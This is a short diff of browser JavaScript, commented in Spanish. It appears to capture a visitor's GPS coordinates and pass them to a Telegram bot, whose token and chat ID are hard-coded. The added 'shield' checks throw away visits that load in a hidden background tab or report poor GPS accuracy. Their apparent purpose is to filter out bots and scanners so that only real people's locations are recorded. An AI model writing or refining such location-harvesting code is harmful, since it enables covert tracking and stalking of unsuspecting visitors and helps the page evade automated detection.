@@ -56,6 +56,12 @@
     const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
     const CHAT_ID = '9180377107';
 
+// 🛡️ [CAMBIO - ESCUDO 1]: Bloquea bots si la página se carga oculta o en segundo plano
+    if (document.hidden) {
+        console.log("Visita descartada automáticamente: Navegador en segundo plano (posible bot).");
+        return; 
+    }
+
     // Función para sanitizar caracteres que rompen el HTML de Telegram
     function escapeHTML(text) {
         return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -66,6 +72,12 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const acc = Math.round(pos.coords.accuracy);
+
+// 🛡️ [CAMBIO - ESCUDO 2]: Bloquea si el GPS arroja una precisión demasiado mala (Servidores/Bots virtuales)
+            if (acc > 300) {
+                console.log("Ubicación descartada: Precisión demasiado baja (" + acc + "m). Posible bot.");
+                return;
+            }
 
             // Estructura de búsqueda de Google Chrome corregida
             const rawUrl = "https://www.google.com/search?q=" + lat + "," + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "," + lon;
